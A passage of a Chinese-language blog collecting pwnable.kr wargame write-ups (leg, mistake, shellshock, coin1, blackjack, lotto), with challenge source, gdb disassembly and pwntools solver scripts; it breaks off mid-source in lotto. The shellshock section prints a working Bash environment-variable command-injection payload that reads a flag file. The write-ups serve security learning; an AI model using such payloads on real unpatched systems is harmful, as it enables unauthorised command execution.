class="line"><span class="comment"># stage 3 env</span></span><br><span class="line">env = &#123;<span class="string">"\xde\xad\xbe\xef"</span>: <span class="string">"\xca\xfe\xba\xbe"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># stage 4 file</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"\x0a"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">"\x00\x00\x00\x00"</span>)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># stage 5 network</span></span><br><span class="line">argv[ord(<span class="string">'C'</span>)] = <span class="string">"9999"</span></span><br><span class="line"></span><br><span class="line">p = process(argv=argv, env=env, stdin=open(<span class="string">"stdin.txt"</span>,<span class="string">"rb"</span>), stderr=open(<span class="string">"stderr.txt"</span>,<span class="string">"rb"</span>))</span><br><span class="line">r = remote(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>)</span><br><span class="line">r.send(<span class="string">"\xde\xad\xbe\xef"</span>)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>
<h2 id="leg">leg</h2>
<h3 id="题目描述-7">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"mov r3, pc\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">	<span class="string">"push	&#123;r6&#125;\n"</span></span><br><span class="line">	<span class="string">"add	r6, pc, $1\n"</span></span><br><span class="line">	<span class="string">"bx	r6\n"</span></span><br><span class="line">	<span class="string">".code   16\n"</span></span><br><span class="line">	<span class="string">"mov	r3, pc\n"</span></span><br><span class="line">	<span class="string">"add	r3, $0x4\n"</span></span><br><span class="line">	<span class="string">"push	&#123;r3&#125;\n"</span></span><br><span class="line">	<span class="string">"pop	&#123;pc&#125;\n"</span></span><br><span class="line">	<span class="string">".code	32\n"</span></span><br><span class="line">	<span class="string">"pop	&#123;r6&#125;\n"</span></span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"mov r3, lr\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Daddy has very strong arm! : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line">	<span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">		<span class="keyword">int</span> fd = open(<span class="string">"flag"</span>, O_RDONLY);</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">		<span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">		write(<span class="number">0</span>, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"I have strong leg :P\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-7">题目解析</h3>
<p>第27行中<code>if( (key1()+key2()+key3()) == key )</code>显示key的值为<code>key1()+key2()+key3()</code>的总和，相等即可得到flag。</p>
<p>源码中的看不懂，直接去看反汇编中的部分代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:		push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:		add	r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:		mov	r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>首先了解下<a href="https://blog.csdn.net/andy7002/article/details/72852822" target="_blank" rel="noopener">ARM函数调用约定</a>，其中，结果为一个32位的整数时,可以通过寄存器R0返回，根据汇编代码可以看出，r3寄存器中的值传给了r0，而pc的值又传给了r3。</p>
<p>再来了解下<a href="https://bbs.ichunqiu.com/thread-40493-1-1.html?from=bkyl" target="_blank" rel="noopener">pc寄存器</a>，具体就不解释了<del>不懂</del>，大概就是</p>
<blockquote>
<p>ARM模式下，pc=当前指令地址+8；</p>
<p>Thumb模式下，pc=当前指令+4</p>
</blockquote>
<p>而控制什么模式的就是一些带状态的指令，比如bx addr，bx就是带状态切换跳转指令，当addr的最后一位为1时，会将跳转地址处的代码解析为Thumb指令，最后一位为0的话，就解析成ARM指令。</p>
<p>所以key1=8cdc+8=8CE4‬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:	adds	r3, #4 </span><br><span class="line">   0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>可以看到pc的值传给了r3，r3再与4相加，最后给r0，这样的话key2的值就应该为8D10‬，但是由于前面执行bx r6时r6最后一位为1，所以执行后面代码时的模式是Thumb模式，所以<code>mov  r3, pc</code>时pc的值为8D08。</p>
<p>key2=8d04+4+4=8D0C‬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>lr-&gt;r3-&gt;r0，lr是寄存器R14: 连接寄存器,记作lr ; 它用于保存子程序的返回地址，返回地址就是调用函数下面那一句的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;</span><br><span class="line">0x00008d80 &lt;+68&gt;:	mov	r3, r0</span><br></pre></td></tr></table></figure>
<p>key3=8d80</p>
<p><strong>key=key1+key2+key3=‭‭0x1A770‬=108400‬</strong></p>
<h2 id="mistake">mistake</h2>
<h3 id="题目描述-8">题目描述</h3>
<blockquote>
<p>hint : operator priority</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</span><br><span class="line">	sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">	<span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input password : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// xor your input</span></span><br><span class="line">	xor(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-8">题目解析</h3>
<p>题目提示操作符优先级</p>
<p>这题问题出在</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><span class="math inline">\(&lt;\)</span>优先级要比<span class="math inline">\(=\)</span>号高，所以会先判断<code>open("/home/mistake/password",O_RDONLY,0400) &lt; 0</code>，<code>open</code>函数读取成功文件描述符，必定大于0，所以<code>open("/home/mistake/password",O_RDONLY,0400) &lt; 0</code>整个式子的值就为false(0)，也就是fd=0。</p>
<p>那么下面的<code>read(fd,pw_buf,PW_LEN)</code>其实就是从标准输入里面读取数据。</p>
<p>当输入1234567890，与1进行异或运算后可以得到0325476981</p>
<h2 id="shellshock">shellshock</h2>
<h3 id="题目描述-9">题目描述</h3>
<blockquote>
<p>Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :)</p>
<p>ssh shellshock@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题目解析-9">题目解析</h3>
<table>
<thead>
<tr class="header">
<th>setresgid</th>
<th>分别设置真实的,有效的和保存过的组标识号</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>setresuid</td>
<td>分别设置真实的,有效的和保存过的用户标识号</td>
</tr>
</tbody>
</table>
<p>再看一下权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shellshock@prowl:~$ ls -l</span><br><span class="line">total 960</span><br><span class="line">-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash</span><br><span class="line">-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag</span><br><span class="line">-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock</span><br><span class="line">-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c</span><br></pre></td></tr></table></figure>
<p>shellshock文件所属组权限中有一个s，而s的含义代表<strong>SGID(Set Group ID, 4)</strong></p>
<ul>
<li><strong>SGID(Set Group ID, 4):</strong></li>
</ul>
<blockquote>
<p>对于可执行文件，<code>SGID</code>与<code>SUID</code>类似，引发的进程的所有组是程序文件所属的组。对于目录，<code>SGID</code>属性会使目录中新建文件的所属组与该目录相同。<code>SGID</code>也可以用s表示，如:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ls -l /vardrwxrwsr-x  2 root staff    4096 Apr 10  2014 localdrwxrwxr-x 15 root syslog   4096 Apr  4 19:57 <span class="built_in">log</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>也就是说shellshock运行时会得到shellshock_pwn的权限。</p>
<p>权限得到了，但是程序中并没有可以得到flag的地方，所以就要利用到shellshock漏洞，漏洞产生原因是由于bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">env x=<span class="string">'() &#123; :;&#125;; echo vulnerable'</span> bash -c <span class="string">"echo this is a test"</span></span><br></pre></td></tr></table></figure>
<p>存在漏洞的bash版本会输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vulnerable</span><br><span class="line">this is a test</span><br></pre></td></tr></table></figure>
<p>在后面加<code>bash -c</code>的原因是打开一个bash使其立即触发漏洞，因为当前bash没有继承环境变量。</p>
<p>所以最终payload：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">env x=<span class="string">'() &#123; :;&#125;; bash -c cat flag'</span> ./shellshock</span><br></pre></td></tr></table></figure>
<h4 id="参考文章">参考文章</h4>
<p>https://www.freebuf.com/articles/system/45390.html</p>
<p>http://aikin.me/2015/04/03/linux-file-permission-ower/</p>
<p>https://blog.csdn.net/starter_____/article/details/78164387</p>
<h2 id="coin1">coin1</h2>
<h3 id="题目描述-10">题目描述</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">-              Shall we play a game?              -</span><br><span class="line">---------------------------------------------------</span><br><span class="line"></span><br><span class="line">You have given some gold coins in your hand</span><br><span class="line">however, there is one counterfeit coin among them</span><br><span class="line">counterfeit coin looks exactly same as real coin</span><br><span class="line">however, its weight is different from real one</span><br><span class="line">real coin weighs 10, counterfeit coin weighes 9</span><br><span class="line">help me to find the counterfeit coin with a scale</span><br><span class="line">if you find 100 counterfeit coins, you will get reward :)</span><br><span class="line">FYI, you have 60 seconds.</span><br><span class="line"></span><br><span class="line">- How to play - </span><br><span class="line">1. you get a number of coins (N) and number of chances (C)</span><br><span class="line">2. then you specify a set of index numbers of coins to be weighed</span><br><span class="line">3. you get the weight information</span><br><span class="line">4. 2~3 repeats C time, then you give the answer</span><br><span class="line"></span><br><span class="line">- Example -</span><br><span class="line">[Server] N&#x3D;4 C&#x3D;2 	# find counterfeit among 4 coins with 2 trial</span><br><span class="line">[Client] 0 1 		# weigh first and second coin</span><br><span class="line">[Server] 20			# scale result : 20</span><br><span class="line">[Client] 3			# weigh fourth coin</span><br><span class="line">[Server] 10			# scale result : 10</span><br><span class="line">[Client] 2 			# counterfeit coin is third!</span><br><span class="line">[Server] Correct!</span><br><span class="line"></span><br><span class="line">- Ready? starting in 3 sec... -</span><br></pre></td></tr></table></figure>
<p>简单来说就是给一组硬币，其中有一个假硬币，真硬币重量10，假的重量9，在有限的次数中猜出来假的硬币是哪一个，可以通过输入<code>0 1 2 3 4 .....</code>来了解<code>0 1 2 3 4 .....</code>这一组硬币重量的综合。</p>
<h3 id="题目解析-10">题目解析</h3>
<p>利用二分查找可以很快得到答案</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"pwnable.kr"</span>, <span class="number">9007</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">    <span class="keyword">print</span> r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    n_c = r.recvline()</span><br><span class="line">    <span class="comment"># print n_c</span></span><br><span class="line">    N = int(n_c.split(<span class="string">" "</span>)[<span class="number">0</span>][<span class="number">2</span>:])</span><br><span class="line">    C = int(n_c.split(<span class="string">" "</span>)[<span class="number">1</span>][<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*]N=%d,C=%d"</span> % (N, C)</span><br><span class="line">    left, right = <span class="number">0</span>, N</span><br><span class="line">    mid = int((left+right) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(C):</span><br><span class="line">        payload = <span class="string">' '</span>.join([str(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(left, mid)])</span><br><span class="line">        r.sendline(payload)</span><br><span class="line">        weight = int(r.recvline())</span><br><span class="line">        <span class="keyword">if</span> weight % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            left = mid</span><br><span class="line">            right = right</span><br><span class="line">            mid = int((right + left) / <span class="number">2.0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = left</span><br><span class="line">            right = mid</span><br><span class="line">            mid = int((left + right) / <span class="number">2.0</span>)</span><br><span class="line">    r.sendline(str(left))</span><br><span class="line">    <span class="keyword">print</span> r.recvline()</span><br></pre></td></tr></table></figure>
<p>但是在本地执行脚本时由于网速问题，导致无法在60s内跑到第100次，所以要把脚本放到服务器上去执行。</p>
<p>连上之前任意一道题目的ssh，在tmp目录下写好脚本，<code>r = remote("pwnable.kr", 9007)</code>改为<code>r = remote("0.0.0.0",9007)</code>即可。</p>
<h2 id="blackjack">blackjack</h2>
<h3 id="题目描述-11">题目描述</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hey! check out this C implementation of blackjack game!</span><br><span class="line">I found it online</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;cboard.cprogramming.com&#x2F;c-programming&#x2F;114023-simple-blackjack-program.html</span><br><span class="line"></span><br><span class="line">I like to give my flags to millionares.</span><br><span class="line">how much money you got?</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9009</span><br></pre></td></tr></table></figure>
<blockquote>
<p>blackjack，又名21点，详见<a href="%5Bhttps://baike.baidu.com/item/21%E7%82%B9/5481683?fr=aladdin%5D(https://baike.baidu.com/item/21点/5481683?fr=aladdin)">游戏规则</a></p>
<p>大概就是赌谁的点大的游戏</p>
</blockquote>
<h3 id="题目解析-11">题目解析</h3>
<p>原本以为是个正经的pwn题，但是看到后面发现是道源码审计题。</p>
<p>主要问题出在<code>betting</code>函数中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\n\nEnter Bet: $"</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (bet &gt; cash) <span class="comment">//If player tries to bet more money than player has</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nYou cannot bet more money than you have."</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter Bet: "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</span><br><span class="line">        <span class="keyword">return</span> bet;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">return</span> bet;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br></pre></td></tr></table></figure>
<p>在判断<code>bet &gt; cash</code>之后，又进行了一次scanf，并且没有进行判断，直接返回。所以第一次输入一个大于500的值，第二次再输入一个大于1000000的数就可以得到flag。</p>
<h2 id="lotto">lotto</h2>
<h3 id="题目描述-12">题目描述</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> r;</span><br><span class="line">	r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</span><br><span class="line">	<span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// generate lotto numbers</span></span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;		<span class="comment">// 1 ~ 45</span></span><br><span class="line">	&#125;</span><br><span class="line">	close(fd);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// calculate lotto score</span></span><br><span class="line">	<span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">				match++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// win!</span></span><br><span class="line">	<span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// menu</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				play();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				help();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</span><br><span class="line">				<span 